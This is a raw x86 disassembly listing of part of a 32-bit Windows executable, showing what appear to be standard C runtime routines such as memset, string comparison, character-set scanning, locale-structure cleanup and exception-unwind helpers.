  4278fc:	call   0x428725
  427901:	xor    ebx,ebx
  427903:	xor    edi,edi
  427905:	or     DWORD PTR [ebp-0x4],0xffffffff
  427909:	cmp    edi,ebx
  42790b:	jne    0x427930
  42790d:	push   DWORD PTR [ebp-0x40]
  427910:	call   0x425fb2
  427915:	pop    ecx
  427916:	mov    edi,eax
  427918:	cmp    edi,ebx
  42791a:	je     0x42794d
  42791c:	push   DWORD PTR [ebp-0x40]
  42791f:	push   ebx
  427920:	push   edi
  427921:	call   0x427b90
  427926:	add    esp,0xc
  427929:	mov    DWORD PTR [ebp-0x38],0x1
  427930:	push   DWORD PTR [ebp-0x40]
  427933:	push   edi
  427934:	push   DWORD PTR [ebp+0x14]
  427937:	push   DWORD PTR [ebp-0x34]
  42793a:	push   DWORD PTR [ebp+0xc]
  42793d:	push   DWORD PTR [ebp+0x8]
  427940:	call   DWORD PTR ds:0x429100
  427946:	mov    DWORD PTR [ebp-0x40],eax
  427949:	cmp    eax,ebx
  42794b:	jne    0x427951
  42794d:	xor    esi,esi
  42794f:	jmp    0x427977
  427951:	push   DWORD PTR [ebp+0x1c]
  427954:	push   DWORD PTR [ebp+0x18]
  427957:	lea    eax,[ebp-0x40]
  42795a:	push   eax
  42795b:	push   edi
  42795c:	push   DWORD PTR [ebp+0x20]
  42795f:	push   DWORD PTR [ebp-0x3c]
  427962:	call   0x428556
  427967:	add    esp,0x18
  42796a:	mov    esi,eax
  42796c:	neg    esi
  42796e:	sbb    esi,esi
  427970:	neg    esi
  427972:	jmp    0x427977
  427974:	mov    esi,DWORD PTR [ebp-0x48]
  427977:	cmp    DWORD PTR [ebp-0x38],ebx
  42797a:	je     0x42799f
  42797c:	push   edi
  42797d:	call   0x425e9a
  427982:	pop    ecx
  427983:	jmp    0x42799f
  427985:	push   DWORD PTR [ebp+0x1c]
  427988:	push   DWORD PTR [ebp+0x18]
  42798b:	push   DWORD PTR [ebp+0x14]
  42798e:	push   DWORD PTR [ebp+0x10]
  427991:	push   DWORD PTR [ebp+0xc]
  427994:	push   DWORD PTR [ebp+0x8]
  427997:	call   DWORD PTR ds:0x429100
  42799d:	mov    esi,eax
  42799f:	cmp    DWORD PTR [ebp-0x34],ebx
  4279a2:	je     0x4279ad
  4279a4:	push   DWORD PTR [ebp-0x34]
  4279a7:	call   0x425e9a
  4279ac:	pop    ecx
  4279ad:	mov    eax,esi
  4279af:	lea    esp,[ebp-0x54]
  4279b2:	call   0x4252cb
  4279b7:	ret    
  4279b8:	push   0x1c
  4279ba:	push   0x429dd0
  4279bf:	call   0x425290
  4279c4:	xor    esi,esi
  4279c6:	cmp    DWORD PTR ds:0x467380,esi
  4279cc:	jne    0x427a03
  4279ce:	lea    eax,[ebp-0x1c]
  4279d1:	push   eax
  4279d2:	xor    edi,edi
  4279d4:	inc    edi
  4279d5:	push   edi
  4279d6:	push   0x429da4
  4279db:	push   edi
  4279dc:	call   DWORD PTR ds:0x429110
  4279e2:	test   eax,eax
  4279e4:	je     0x4279ee
  4279e6:	mov    DWORD PTR ds:0x467380,edi
  4279ec:	jmp    0x427a03
  4279ee:	call   DWORD PTR ds:0x429034
  4279f4:	cmp    eax,0x78
  4279f7:	jne    0x427a03
  4279f9:	mov    DWORD PTR ds:0x467380,0x2
  427a03:	mov    eax,ds:0x467380
  427a08:	cmp    eax,0x2
  427a0b:	je     0x427afb
  427a11:	cmp    eax,esi
  427a13:	je     0x427afb
  427a19:	cmp    eax,0x1
  427a1c:	jne    0x427b21
  427a22:	mov    DWORD PTR [ebp-0x20],esi
  427a25:	mov    DWORD PTR [ebp-0x24],esi
  427a28:	cmp    DWORD PTR [ebp+0x18],esi
  427a2b:	jne    0x427a35
  427a2d:	mov    eax,ds:0x467374
  427a32:	mov    DWORD PTR [ebp+0x18],eax
  427a35:	push   esi
  427a36:	push   esi
  427a37:	push   DWORD PTR [ebp+0x10]
  427a3a:	push   DWORD PTR [ebp+0xc]
  427a3d:	xor    eax,eax
  427a3f:	cmp    DWORD PTR [ebp+0x20],esi
  427a42:	setne  al
  427a45:	lea    eax,[eax*8+0x1]
  427a4c:	push   eax
  427a4d:	push   DWORD PTR [ebp+0x18]
  427a50:	call   DWORD PTR ds:0x429104
  427a56:	mov    edi,eax
  427a58:	mov    DWORD PTR [ebp-0x28],edi
  427a5b:	test   edi,edi
  427a5d:	je     0x427b21
  427a63:	and    DWORD PTR [ebp-0x4],0x0
  427a67:	lea    ebx,[edi+edi*1]
  427a6a:	mov    eax,ebx
  427a6c:	add    eax,0x3
  427a6f:	and    eax,0xfffffffc
  427a72:	call   0x4252e0
  427a77:	mov    DWORD PTR [ebp-0x18],esp
  427a7a:	mov    esi,esp
  427a7c:	mov    DWORD PTR [ebp-0x2c],esi
  427a7f:	push   ebx
  427a80:	push   0x0
  427a82:	push   esi
  427a83:	call   0x427b90
  427a88:	add    esp,0xc
  427a8b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427a8f:	jmp    0x427aa6
  427a91:	xor    eax,eax
  427a93:	inc    eax
  427a94:	ret    
  427a95:	mov    esp,DWORD PTR [ebp-0x18]
  427a98:	call   0x428725
  427a9d:	xor    esi,esi
  427a9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa3:	mov    edi,DWORD PTR [ebp-0x28]
  427aa6:	test   esi,esi
  427aa8:	jne    0x427ac1
  427aaa:	push   edi
  427aab:	push   0x2
  427aad:	call   0x4263a8
  427ab2:	pop    ecx
  427ab3:	pop    ecx
  427ab4:	mov    esi,eax
  427ab6:	test   esi,esi
  427ab8:	je     0x427b21
  427aba:	mov    DWORD PTR [ebp-0x24],0x1
  427ac1:	push   edi
  427ac2:	push   esi
  427ac3:	push   DWORD PTR [ebp+0x10]
  427ac6:	push   DWORD PTR [ebp+0xc]
  427ac9:	push   0x1
  427acb:	push   DWORD PTR [ebp+0x18]
  427ace:	call   DWORD PTR ds:0x429104
  427ad4:	test   eax,eax
  427ad6:	je     0x427ae9
  427ad8:	push   DWORD PTR [ebp+0x14]
  427adb:	push   eax
  427adc:	push   esi
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429110
  427ae6:	mov    DWORD PTR [ebp-0x20],eax
  427ae9:	cmp    DWORD PTR [ebp-0x24],0x0
  427aed:	je     0x427af6
  427aef:	push   esi
  427af0:	call   0x425e9a
  427af5:	pop    ecx
  427af6:	mov    eax,DWORD PTR [ebp-0x20]
  427af9:	jmp    0x427b69
  427afb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427afe:	cmp    ebx,esi
  427b00:	jne    0x427b08
  427b02:	mov    ebx,DWORD PTR ds:0x467364
  427b08:	mov    edi,DWORD PTR [ebp+0x18]
  427b0b:	test   edi,edi
  427b0d:	jne    0x427b15
  427b0f:	mov    edi,DWORD PTR ds:0x467374
  427b15:	push   ebx
  427b16:	call   0x42850d
  427b1b:	pop    ecx
  427b1c:	cmp    eax,0xffffffff
  427b1f:	jne    0x427b25
  427b21:	xor    eax,eax
  427b23:	jmp    0x427b69
  427b25:	cmp    eax,edi
  427b27:	je     0x427b47
  427b29:	push   0x0
  427b2b:	push   0x0
  427b2d:	lea    ecx,[ebp+0x10]
  427b30:	push   ecx
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   eax
  427b35:	push   edi
  427b36:	call   0x428556
  427b3b:	add    esp,0x18
  427b3e:	mov    esi,eax
  427b40:	test   esi,esi
  427b42:	je     0x427b21
  427b44:	mov    DWORD PTR [ebp+0xc],esi
  427b47:	push   DWORD PTR [ebp+0x14]
  427b4a:	push   DWORD PTR [ebp+0x10]
  427b4d:	push   DWORD PTR [ebp+0xc]
  427b50:	push   DWORD PTR [ebp+0x8]
  427b53:	push   ebx
  427b54:	call   DWORD PTR ds:0x42910c
  427b5a:	mov    edi,eax
  427b5c:	test   esi,esi
  427b5e:	je     0x427b67
  427b60:	push   esi
  427b61:	call   0x425e9a
  427b66:	pop    ecx
  427b67:	mov    eax,edi
  427b69:	lea    esp,[ebp-0x38]
  427b6c:	call   0x4252cb
  427b71:	ret    
  427b72:	mov    eax,ds:0x467384
  427b77:	test   eax,eax
  427b79:	je     0x427b8a
  427b7b:	push   DWORD PTR [esp+0x4]
  427b7f:	call   eax
  427b81:	test   eax,eax
  427b83:	pop    ecx
  427b84:	je     0x427b8a
  427b86:	xor    eax,eax
  427b88:	inc    eax
  427b89:	ret    
  427b8a:	xor    eax,eax
  427b8c:	ret    
  427b8d:	int3   
  427b8e:	int3   
  427b8f:	int3   
  427b90:	mov    edx,DWORD PTR [esp+0xc]
  427b94:	mov    ecx,DWORD PTR [esp+0x4]
  427b98:	test   edx,edx
  427b9a:	je     0x427beb
  427b9c:	xor    eax,eax
  427b9e:	mov    al,BYTE PTR [esp+0x8]
  427ba2:	push   edi
  427ba3:	mov    edi,ecx
  427ba5:	cmp    edx,0x4
  427ba8:	jb     0x427bdb
  427baa:	neg    ecx
  427bac:	and    ecx,0x3
  427baf:	je     0x427bbd
  427bb1:	sub    edx,ecx
  427bb3:	mov    BYTE PTR [edi],al
  427bb5:	add    edi,0x1
  427bb8:	sub    ecx,0x1
  427bbb:	jne    0x427bb3
  427bbd:	mov    ecx,eax
  427bbf:	shl    eax,0x8
  427bc2:	add    eax,ecx
  427bc4:	mov    ecx,eax
  427bc6:	shl    eax,0x10
  427bc9:	add    eax,ecx
  427bcb:	mov    ecx,edx
  427bcd:	and    edx,0x3
  427bd0:	shr    ecx,0x2
  427bd3:	je     0x427bdb
  427bd5:	rep stos DWORD PTR es:[edi],eax
  427bd7:	test   edx,edx
  427bd9:	je     0x427be5
  427bdb:	mov    BYTE PTR [edi],al
  427bdd:	add    edi,0x1
  427be0:	sub    edx,0x1
  427be3:	jne    0x427bdb
  427be5:	mov    eax,DWORD PTR [esp+0x8]
  427be9:	pop    edi
  427bea:	ret    
  427beb:	mov    eax,DWORD PTR [esp+0x4]
  427bef:	ret    
  427bf0:	push   esi
  427bf1:	mov    esi,DWORD PTR [esp+0x8]
  427bf5:	test   esi,esi
  427bf7:	je     0x427d7e
  427bfd:	push   DWORD PTR [esi+0x4]
  427c00:	call   0x425e9a
  427c05:	push   DWORD PTR [esi+0x8]
  427c08:	call   0x425e9a
  427c0d:	push   DWORD PTR [esi+0xc]
  427c10:	call   0x425e9a
  427c15:	push   DWORD PTR [esi+0x10]
  427c18:	call   0x425e9a
  427c1d:	push   DWORD PTR [esi+0x14]
  427c20:	call   0x425e9a
  427c25:	push   DWORD PTR [esi+0x18]
  427c28:	call   0x425e9a
  427c2d:	push   DWORD PTR [esi]
  427c2f:	call   0x425e9a
  427c34:	push   DWORD PTR [esi+0x20]
  427c37:	call   0x425e9a
  427c3c:	push   DWORD PTR [esi+0x24]
  427c3f:	call   0x425e9a
  427c44:	push   DWORD PTR [esi+0x28]
  427c47:	call   0x425e9a
  427c4c:	push   DWORD PTR [esi+0x2c]
  427c4f:	call   0x425e9a
  427c54:	push   DWORD PTR [esi+0x30]
  427c57:	call   0x425e9a
  427c5c:	push   DWORD PTR [esi+0x34]
  427c5f:	call   0x425e9a
  427c64:	push   DWORD PTR [esi+0x1c]
  427c67:	call   0x425e9a
  427c6c:	push   DWORD PTR [esi+0x38]
  427c6f:	call   0x425e9a
  427c74:	push   DWORD PTR [esi+0x3c]
  427c77:	call   0x425e9a
  427c7c:	add    esp,0x40
  427c7f:	push   DWORD PTR [esi+0x40]
  427c82:	call   0x425e9a
  427c87:	push   DWORD PTR [esi+0x44]
  427c8a:	call   0x425e9a
  427c8f:	push   DWORD PTR [esi+0x48]
  427c92:	call   0x425e9a
  427c97:	push   DWORD PTR [esi+0x4c]
  427c9a:	call   0x425e9a
  427c9f:	push   DWORD PTR [esi+0x50]
  427ca2:	call   0x425e9a
  427ca7:	push   DWORD PTR [esi+0x54]
  427caa:	call   0x425e9a
  427caf:	push   DWORD PTR [esi+0x58]
  427cb2:	call   0x425e9a
  427cb7:	push   DWORD PTR [esi+0x5c]
  427cba:	call   0x425e9a
  427cbf:	push   DWORD PTR [esi+0x60]
  427cc2:	call   0x425e9a
  427cc7:	push   DWORD PTR [esi+0x64]
  427cca:	call   0x425e9a
  427ccf:	push   DWORD PTR [esi+0x68]
  427cd2:	call   0x425e9a
  427cd7:	push   DWORD PTR [esi+0x6c]
  427cda:	call   0x425e9a
  427cdf:	push   DWORD PTR [esi+0x70]
  427ce2:	call   0x425e9a
  427ce7:	push   DWORD PTR [esi+0x74]
  427cea:	call   0x425e9a
  427cef:	push   DWORD PTR [esi+0x78]
  427cf2:	call   0x425e9a
  427cf7:	push   DWORD PTR [esi+0x7c]
  427cfa:	call   0x425e9a
  427cff:	add    esp,0x40
  427d02:	push   DWORD PTR [esi+0x80]
  427d08:	call   0x425e9a
  427d0d:	push   DWORD PTR [esi+0x84]
  427d13:	call   0x425e9a
  427d18:	push   DWORD PTR [esi+0x88]
  427d1e:	call   0x425e9a
  427d23:	push   DWORD PTR [esi+0x8c]
  427d29:	call   0x425e9a
  427d2e:	push   DWORD PTR [esi+0x90]
  427d34:	call   0x425e9a
  427d39:	push   DWORD PTR [esi+0x94]
  427d3f:	call   0x425e9a
  427d44:	push   DWORD PTR [esi+0x98]
  427d4a:	call   0x425e9a
  427d4f:	push   DWORD PTR [esi+0x9c]
  427d55:	call   0x425e9a
  427d5a:	push   DWORD PTR [esi+0xa0]
  427d60:	call   0x425e9a
  427d65:	push   DWORD PTR [esi+0xa4]
  427d6b:	call   0x425e9a
  427d70:	push   DWORD PTR [esi+0xa8]
  427d76:	call   0x425e9a
  427d7b:	add    esp,0x2c
  427d7e:	pop    esi
  427d7f:	ret    
  427d80:	push   esi
  427d81:	mov    esi,DWORD PTR [esp+0x8]
  427d85:	test   esi,esi
  427d87:	je     0x427ddd
  427d89:	mov    eax,DWORD PTR [esi]
  427d8b:	mov    ecx,DWORD PTR ds:0x466ef4
  427d91:	cmp    eax,DWORD PTR [ecx]
  427d93:	je     0x427da4
  427d95:	cmp    eax,DWORD PTR ds:0x466ec4
  427d9b:	je     0x427da4
  427d9d:	push   eax
  427d9e:	call   0x425e9a
  427da3:	pop    ecx
  427da4:	mov    eax,DWORD PTR [esi+0x4]
  427da7:	mov    ecx,DWORD PTR ds:0x466ef4
  427dad:	cmp    eax,DWORD PTR [ecx+0x4]
  427db0:	je     0x427dc1
  427db2:	cmp    eax,DWORD PTR ds:0x466ec8
  427db8:	je     0x427dc1
  427dba:	push   eax
  427dbb:	call   0x425e9a
  427dc0:	pop    ecx
  427dc1:	mov    esi,DWORD PTR [esi+0x8]
  427dc4:	mov    eax,ds:0x466ef4
  427dc9:	cmp    esi,DWORD PTR [eax+0x8]
  427dcc:	je     0x427ddd
  427dce:	cmp    esi,DWORD PTR ds:0x466ecc
  427dd4:	je     0x427ddd
  427dd6:	push   esi
  427dd7:	call   0x425e9a
  427ddc:	pop    ecx
  427ddd:	pop    esi
  427dde:	ret    
  427ddf:	push   esi
  427de0:	mov    esi,DWORD PTR [esp+0x8]
  427de4:	test   esi,esi
  427de6:	je     0x427eb6
  427dec:	mov    eax,DWORD PTR [esi+0xc]
  427def:	mov    ecx,DWORD PTR ds:0x466ef4
  427df5:	cmp    eax,DWORD PTR [ecx+0xc]
  427df8:	je     0x427e09
  427dfa:	cmp    eax,DWORD PTR ds:0x466ed0
  427e00:	je     0x427e09
  427e02:	push   eax
  427e03:	call   0x425e9a
  427e08:	pop    ecx
  427e09:	mov    eax,DWORD PTR [esi+0x10]
  427e0c:	mov    ecx,DWORD PTR ds:0x466ef4
  427e12:	cmp    eax,DWORD PTR [ecx+0x10]
  427e15:	je     0x427e26
  427e17:	cmp    eax,DWORD PTR ds:0x466ed4
  427e1d:	je     0x427e26
  427e1f:	push   eax
  427e20:	call   0x425e9a
  427e25:	pop    ecx
  427e26:	mov    eax,DWORD PTR [esi+0x14]
  427e29:	mov    ecx,DWORD PTR ds:0x466ef4
  427e2f:	cmp    eax,DWORD PTR [ecx+0x14]
  427e32:	je     0x427e43
  427e34:	cmp    eax,DWORD PTR ds:0x466ed8
  427e3a:	je     0x427e43
  427e3c:	push   eax
  427e3d:	call   0x425e9a
  427e42:	pop    ecx
  427e43:	mov    eax,DWORD PTR [esi+0x18]
  427e46:	mov    ecx,DWORD PTR ds:0x466ef4
  427e4c:	cmp    eax,DWORD PTR [ecx+0x18]
  427e4f:	je     0x427e60
  427e51:	cmp    eax,DWORD PTR ds:0x466edc
  427e57:	je     0x427e60
  427e59:	push   eax
  427e5a:	call   0x425e9a
  427e5f:	pop    ecx
  427e60:	mov    eax,DWORD PTR [esi+0x1c]
  427e63:	mov    ecx,DWORD PTR ds:0x466ef4
  427e69:	cmp    eax,DWORD PTR [ecx+0x1c]
  427e6c:	je     0x427e7d
  427e6e:	cmp    eax,DWORD PTR ds:0x466ee0
  427e74:	je     0x427e7d
  427e76:	push   eax
  427e77:	call   0x425e9a
  427e7c:	pop    ecx
  427e7d:	mov    eax,DWORD PTR [esi+0x20]
  427e80:	mov    ecx,DWORD PTR ds:0x466ef4
  427e86:	cmp    eax,DWORD PTR [ecx+0x20]
  427e89:	je     0x427e9a
  427e8b:	cmp    eax,DWORD PTR ds:0x466ee4
  427e91:	je     0x427e9a
  427e93:	push   eax
  427e94:	call   0x425e9a
  427e99:	pop    ecx
  427e9a:	mov    esi,DWORD PTR [esi+0x24]
  427e9d:	mov    eax,ds:0x466ef4
  427ea2:	cmp    esi,DWORD PTR [eax+0x24]
  427ea5:	je     0x427eb6
  427ea7:	cmp    esi,DWORD PTR ds:0x466ee8
  427ead:	je     0x427eb6
  427eaf:	push   esi
  427eb0:	call   0x425e9a
  427eb5:	pop    ecx
  427eb6:	pop    esi
  427eb7:	ret    
  427eb8:	int3   
  427eb9:	int3   
  427eba:	int3   
  427ebb:	int3   
  427ebc:	int3   
  427ebd:	int3   
  427ebe:	int3   
  427ebf:	int3   
  427ec0:	push   ebp
  427ec1:	mov    ebp,esp
  427ec3:	push   esi
  427ec4:	xor    eax,eax
  427ec6:	push   eax
  427ec7:	push   eax
  427ec8:	push   eax
  427ec9:	push   eax
  427eca:	push   eax
  427ecb:	push   eax
  427ecc:	push   eax
  427ecd:	push   eax
  427ece:	mov    edx,DWORD PTR [ebp+0xc]
  427ed1:	lea    ecx,[ecx+0x0]
  427ed4:	mov    al,BYTE PTR [edx]
  427ed6:	or     al,al
  427ed8:	je     0x427ee3
  427eda:	add    edx,0x1
  427edd:	bts    DWORD PTR [esp],eax
  427ee1:	jmp    0x427ed4
  427ee3:	mov    esi,DWORD PTR [ebp+0x8]
  427ee6:	or     ecx,0xffffffff
  427ee9:	lea    ecx,[ecx+0x0]
  427eec:	add    ecx,0x1
  427eef:	mov    al,BYTE PTR [esi]
  427ef1:	or     al,al
  427ef3:	je     0x427efe
  427ef5:	add    esi,0x1
  427ef8:	bt     DWORD PTR [esp],eax
  427efc:	jae    0x427eec
  427efe:	mov    eax,ecx
  427f00:	add    esp,0x20
  427f03:	pop    esi
  427f04:	leave  
  427f05:	ret    
  427f06:	int3   
  427f07:	int3   
  427f08:	int3   
  427f09:	int3   
  427f0a:	int3   
  427f0b:	int3   
  427f0c:	int3   
  427f0d:	int3   
  427f0e:	int3   
  427f0f:	int3   
  427f10:	mov    edx,DWORD PTR [esp+0x4]
  427f14:	mov    ecx,DWORD PTR [esp+0x8]
  427f18:	test   edx,0x3
  427f1e:	jne    0x427f5c
  427f20:	mov    eax,DWORD PTR [edx]
  427f22:	cmp    al,BYTE PTR [ecx]
  427f24:	jne    0x427f54
  427f26:	or     al,al
  427f28:	je     0x427f50
  427f2a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f2d:	jne    0x427f54
  427f2f:	or     ah,ah
  427f31:	je     0x427f50
  427f33:	shr    eax,0x10
  427f36:	cmp    al,BYTE PTR [ecx+0x2]
  427f39:	jne    0x427f54
  427f3b:	or     al,al
  427f3d:	je     0x427f50
  427f3f:	cmp    ah,BYTE PTR [ecx+0x3]
  427f42:	jne    0x427f54
  427f44:	add    ecx,0x4
  427f47:	add    edx,0x4
  427f4a:	or     ah,ah
  427f4c:	jne    0x427f20
  427f4e:	mov    edi,edi
  427f50:	xor    eax,eax
  427f52:	ret    
  427f53:	nop
  427f54:	sbb    eax,eax
  427f56:	shl    eax,1
  427f58:	add    eax,0x1
  427f5b:	ret    
  427f5c:	test   edx,0x1
  427f62:	je     0x427f7c
  427f64:	mov    al,BYTE PTR [edx]
  427f66:	add    edx,0x1
  427f69:	cmp    al,BYTE PTR [ecx]
  427f6b:	jne    0x427f54
  427f6d:	add    ecx,0x1
  427f70:	or     al,al
  427f72:	je     0x427f50
  427f74:	test   edx,0x2
  427f7a:	je     0x427f20
  427f7c:	mov    ax,WORD PTR [edx]
  427f7f:	add    edx,0x2
  427f82:	cmp    al,BYTE PTR [ecx]
  427f84:	jne    0x427f54
  427f86:	or     al,al
  427f88:	je     0x427f50
  427f8a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f8d:	jne    0x427f54
  427f8f:	or     ah,ah
  427f91:	je     0x427f50
  427f93:	add    ecx,0x2
  427f96:	jmp    0x427f20
  427f98:	int3   
  427f99:	int3   
  427f9a:	int3   
  427f9b:	int3   
  427f9c:	int3   
  427f9d:	int3   
  427f9e:	int3   
  427f9f:	int3   
  427fa0:	mov    eax,DWORD PTR [esp+0xc]
  427fa4:	test   eax,eax
  427fa6:	je     0x427ff2
  427fa8:	mov    edx,DWORD PTR [esp+0x4]
  427fac:	push   esi
  427fad:	push   edi
  427fae:	mov    esi,edx
  427fb0:	mov    edi,DWORD PTR [esp+0x10]
  427fb4:	or     edx,edi
  427fb6:	and    edx,0x3
  427fb9:	je     0x427ff3
  427fbb:	test   eax,0x1
  427fc0:	je     0x427fd3
  427fc2:	mov    cl,BYTE PTR [esi]
  427fc4:	cmp    cl,BYTE PTR [edi]
  427fc6:	jne    0x428020
  427fc8:	add    esi,0x1
  427fcb:	add    edi,0x1
  427fce:	sub    eax,0x1
  427fd1:	je     0x427ff0
  427fd3:	mov    cl,BYTE PTR [esi]
  427fd5:	mov    dl,BYTE PTR [edi]
  427fd7:	cmp    cl,dl
  427fd9:	jne    0x428020
  427fdb:	mov    cl,BYTE PTR [esi+0x1]
  427fde:	mov    dl,BYTE PTR [edi+0x1]
  427fe1:	cmp    cl,dl
  427fe3:	jne    0x428020
  427fe5:	add    edi,0x2
  427fe8:	add    esi,0x2
  427feb:	sub    eax,0x2
  427fee:	jne    0x427fd3
  427ff0:	pop    edi
  427ff1:	pop    esi
  427ff2:	ret    
  427ff3:	mov    ecx,eax
  427ff5:	and    eax,0x3
  427ff8:	shr    ecx,0x2
  427ffb:	je     0x428028
  427ffd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fff:	je     0x428028
  428001:	mov    ecx,DWORD PTR [esi-0x4]
  428004:	mov    edx,DWORD PTR [edi-0x4]
  428007:	cmp    cl,dl
  428009:	jne    0x42801b
  42800b:	cmp    ch,dh
  42800d:	jne    0x42801b
  42800f:	shr    ecx,0x10
  428012:	shr    edx,0x10
  428015:	cmp    cl,dl
  428017:	jne    0x42801b
  428019:	cmp    ch,dh
  42801b:	mov    eax,0x0
  428020:	sbb    eax,eax
  428022:	pop    edi
  428023:	sbb    eax,0xffffffff
  428026:	pop    esi
  428027:	ret    
  428028:	test   eax,eax
  42802a:	je     0x427ff0
  42802c:	mov    edx,DWORD PTR [esi]
  42802e:	mov    ecx,DWORD PTR [edi]
  428030:	cmp    dl,cl
  428032:	jne    0x42801b
  428034:	sub    eax,0x1
  428037:	je     0x428055
  428039:	cmp    dh,ch
  42803b:	jne    0x42801b
  42803d:	sub    eax,0x1
  428040:	je     0x428055
  428042:	and    ecx,0xff0000
  428048:	and    edx,0xff0000
  42804e:	cmp    edx,ecx
  428050:	jne    0x42801b
  428052:	sub    eax,0x1
  428055:	pop    edi
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   edi
  428064:	push   esi
  428065:	push   ebx
  428066:	mov    ecx,DWORD PTR [ebp+0x10]
  428069:	jecxz  0x428092
  42806b:	mov    ebx,ecx
  42806d:	mov    edi,DWORD PTR [ebp+0x8]
  428070:	mov    esi,edi
  428072:	xor    eax,eax
  428074:	repnz scas al,BYTE PTR es:[edi]
  428076:	neg    ecx
  428078:	add    ecx,ebx
  42807a:	mov    edi,esi
  42807c:	mov    esi,DWORD PTR [ebp+0xc]
  42807f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428081:	mov    al,BYTE PTR [esi-0x1]
  428084:	xor    ecx,ecx
  428086:	cmp    al,BYTE PTR [edi-0x1]
  428089:	ja     0x428090
  42808b:	je     0x428092
  42808d:	sub    ecx,0x2
  428090:	not    ecx
  428092:	mov    eax,ecx
  428094:	pop    ebx
  428095:	pop    esi
  428096:	pop    edi
  428097:	leave  
  428098:	ret    
  428099:	int3   
  42809a:	int3   
  42809b:	int3   
  42809c:	int3   
  42809d:	int3   
  42809e:	int3   
  42809f:	int3   
  4280a0:	push   ebp
  4280a1:	mov    ebp,esp
  4280a3:	push   esi
  4280a4:	xor    eax,eax
  4280a6:	push   eax
  4280a7:	push   eax
  4280a8:	push   eax
  4280a9:	push   eax
  4280aa:	push   eax
  4280ab:	push   eax
  4280ac:	push   eax
  4280ad:	push   eax
  4280ae:	mov    edx,DWORD PTR [ebp+0xc]
  4280b1:	lea    ecx,[ecx+0x0]
  4280b4:	mov    al,BYTE PTR [edx]
  4280b6:	or     al,al
  4280b8:	je     0x4280c3
  4280ba:	add    edx,0x1
  4280bd:	bts    DWORD PTR [esp],eax
  4280c1:	jmp    0x4280b4
  4280c3:	mov    esi,DWORD PTR [ebp+0x8]
  4280c6:	mov    edi,edi
  4280c8:	mov    al,BYTE PTR [esi]
  4280ca:	or     al,al
  4280cc:	je     0x4280da
  4280ce:	add    esi,0x1
  4280d1:	bt     DWORD PTR [esp],eax
  4280d5:	jae    0x4280c8
  4280d7:	lea    eax,[esi-0x1]
  4280da:	add    esp,0x20
  4280dd:	pop    esi
  4280de:	leave  
  4280df:	ret    
  4280e0:	push   ebp
  4280e1:	mov    ebp,esp
  4280e3:	push   ebx
  4280e4:	push   esi
  4280e5:	push   edi
  4280e6:	push   ebp
  4280e7:	push   0x0
  4280e9:	push   0x0
  4280eb:	push   0x4280f8
  4280f0:	push   DWORD PTR [ebp+0x8]
  4280f3:	call   0x428b6e
  4280f8:	pop    ebp
  4280f9:	pop    edi
  4280fa:	pop    esi
  4280fb:	pop    ebx
  4280fc:	mov    esp,ebp
  4280fe:	pop    ebp
  4280ff:	ret    
  428100:	mov    ecx,DWORD PTR [esp+0x4]
  428104:	test   DWORD PTR [ecx+0x4],0x6
  42810b:	mov    eax,0x1
  428110:	je     0x428121
  428112:	mov    eax,DWORD PTR [esp+0x8]
  428116:	mov    edx,DWORD PTR [esp+0x10]
  42811a:	mov    DWORD PTR [edx],eax
  42811c:	mov    eax,0x3
  428121:	ret    
  428122:	push   ebx
  428123:	push   esi
  428124:	push   edi
  428125:	mov    eax,DWORD PTR [esp+0x10]
  428129:	push   eax
  42812a:	push   0xfffffffe
  42812c:	push   0x428100
  428131:	push   DWORD PTR fs:0x0
  428138:	mov    DWORD PTR fs:0x0,esp
  42813f:	mov    eax,DWORD PTR [esp+0x20]
  428143:	mov    ebx,DWORD PTR [eax+0x8]
  428146:	mov    esi,DWORD PTR [eax+0xc]
  428149:	cmp    esi,0xffffffff
  42814c:	je     0x42817c
  42814e:	cmp    esi,DWORD PTR [esp+0x24]
  428152:	je     0x42817c
  428154:	lea    esi,[esi+esi*2]
  428157:	mov    ecx,DWORD PTR [ebx+esi*4]
  42815a:	mov    DWORD PTR [esp+0x8],ecx
  42815e:	mov    DWORD PTR [eax+0xc],ecx
  428161:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428166:	jne    0x42817a
  428168:	push   0x101
  42816d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428171:	call   0x4281b6
  428176:	call   DWORD PTR [ebx+esi*4+0x8]
  42817a:	jmp    0x42813f
  42817c:	pop    DWORD PTR fs:0x0
  428183:	add    esp,0xc
  428186:	pop    edi
  428187:	pop    esi
  428188:	pop    ebx
  428189:	ret    
  42818a:	xor    eax,eax
  42818c:	mov    ecx,DWORD PTR fs:0x0
  428193:	cmp    DWORD PTR [ecx+0x4],0x428100
  42819a:	jne    0x4281ac
  42819c:	mov    edx,DWORD PTR [ecx+0xc]
  42819f:	mov    edx,DWORD PTR [edx+0xc]
  4281a2:	cmp    DWORD PTR [ecx+0x8],edx
  4281a5:	jne    0x4281ac
  4281a7:	mov    eax,0x1
  4281ac:	ret    
  4281ad:	push   ebx
  4281ae:	push   ecx
  4281af:	mov    ebx,0x466f0c
  4281b4:	jmp    0x4281c0
  4281b6:	push   ebx
  4281b7:	push   ecx
  4281b8:	mov    ebx,0x466f0c
  4281bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4281c0:	mov    DWORD PTR [ebx+0x8],ecx
  4281c3:	mov    DWORD PTR [ebx+0x4],eax
  4281c6:	mov    DWORD PTR [ebx+0xc],ebp
  4281c9:	pop    ecx
  4281ca:	pop    ebx
  4281cb:	ret    0x4
  4281ce:	int3   
  4281cf:	int3   
  4281d0:	push   ebp
  4281d1:	mov    ebp,esp
  4281d3:	push   edi
  4281d4:	push   esi
  4281d5:	mov    esi,DWORD PTR [ebp+0xc]
  4281d8:	mov    ecx,DWORD PTR [ebp+0x10]
